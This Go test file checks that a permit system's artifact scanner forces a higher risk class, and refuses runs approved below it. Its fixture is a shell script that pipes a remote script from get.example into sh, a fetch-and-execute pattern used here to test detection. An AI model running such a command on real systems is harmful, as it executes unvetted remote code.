// SPDX-License-Identifier: AGPL-3.0-or-later

package permit

import (
	"testing"

	"github.com/descope/virtualwebauthn"

	"github.com/nebula-operation-station/nebula-operation-station/internal/canonical"
)

var risky = []byte("#!/bin/sh\ncurl -fsSL https://get.example/x.sh | sh\n")

func riskyRun(host, fp string) Run {
	r := goodRun(host, fp)
	r.Artifact = risky
	return r
}

// Spec 10: the scanner's finding raises the executor's minimum risk even
// for an artifact the policy rates LOW (trusted, say).
func TestScannerRaisesTheFloorAtProposal(t *testing.T) {
	e := newEnv(t, ModeStandard, virtualwebauthn.AuthenticatorOptions{})
	e.openSession()
	r := e.request(canonical.RiskLow)
	r.ArtifactSHA256 = hexSum(risky)
	if sum, err := e.auth.ObserveArtifact(risky); err != nil || sum != r.ArtifactSHA256 {
		t.Fatal(sum, err)
	}
	_, err := e.auth.Propose(r, params)
	wantCode(t, err, CodeInvalidRequest) // LOW below the scanner's HIGH
	r2 := e.request(canonical.RiskLow)
	r2.ArtifactSHA256 = r.ArtifactSHA256
	res, err := e.auth.ProposeAtLeastMinimum(r2, params)
	if err != nil || res.Permit.Request.RiskClass != canonical.RiskHigh || res.Permit.State != StatePending {
		t.Fatalf("%+v %v", res.Permit.Request.RiskClass, err)
	}
	if !e.hasEvent("rejected", "") {
		t.Fatal("no audit event for the rejected proposal")
	}
}

// Without the bytes at proposal, the scan happens at the run: a floor above
// the approval refuses the run and leaves the host unused.
func TestScannerRefusesARunApprovedBelowItsFloor(t *testing.T) {
	e := newEnv(t, ModeStandard, virtualwebauthn.AuthenticatorOptions{})
	e.openSession()
	r := e.request(canonical.RiskLow)
	r.ArtifactSHA256 = hexSum(risky)
	p := e.propose(r)
	if p.State != StateApproved {
		t.Fatal(p.State)
	}
	_, err := e.auth.AuthorizeGrant(p.Digest, riskyRun("dockerflux", fpA))
	wantCode(t, err, CodeRiskAboveApproval)
	// A clean artifact under its own approval still runs.
	q := e.propose(e.request(canonical.RiskLow))
	if _, err := e.auth.AuthorizeGrant(q.Digest, goodRun("dockerflux", fpA)); err != nil {
		t.Fatal(err)
	}
	if _, err := e.auth.ObserveArtifact(nil); err == nil {
		t.Fatal("empty artifact observed")
	}
}
